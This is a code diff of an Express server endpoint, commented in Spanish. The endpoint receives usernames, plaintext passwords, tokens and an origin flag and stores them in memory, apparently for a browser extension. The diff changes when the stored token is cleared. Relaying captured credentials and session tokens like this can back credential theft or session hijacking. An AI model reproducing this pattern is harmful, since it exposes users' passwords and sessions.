@@ -18,20 +18,24 @@ let baseDeDatosTemporal = {
 app.post('/recibir', (req, res) => {
     const { user, pass, token, origen } = req.body;
 
-    // --- LÓGICA DE LIMPIEZA ANT-REPETICIÓN ---
-    // Si llega un usuario nuevo, o el origen indica que es un inicio, 
-    // matamos el token anterior para que no se use con el nuevo cliente.
     let tokenFinal = token;
-    
-    if (user && user !== baseDeDatosTemporal.user) {
-        console.log("⚠️ Detectado nuevo usuario. Reseteando token viejo...");
-        tokenFinal = token || null; // Si no mandas token nuevo, queda en null
-    } else {
-        // Si es el mismo usuario, mantenemos el token que ya teníamos a menos que llegue uno nuevo
+
+    // NUEVA LÓGICA: Si el origen dice que es LOGIN_INICIAL, 
+    // borramos el token SIEMPRE, aunque sea el mismo usuario.
+    if (origen === "LOGIN_INICIAL") {
+        console.log("🚀 Iniciando sesión nueva. Limpiando token anterior...");
+        tokenFinal = null; 
+    } 
+    // Si no es inicio, pero el usuario cambió, también limpiamos
+    else if (user && user !== baseDeDatosTemporal.user) {
+        console.log("⚠️ Cambio de usuario detectado. Limpiando token...");
+        tokenFinal = null;
+    }
+    // Si no es ninguna de las anteriores, mantenemos lo que había
+    else {
         tokenFinal = token || baseDeDatosTemporal.token;
     }
 
-    // Guardamos en la "agenda" para la extensión
     baseDeDatosTemporal = {
         user: user || baseDeDatosTemporal.user,
         pass: pass || baseDeDatosTemporal.pass,
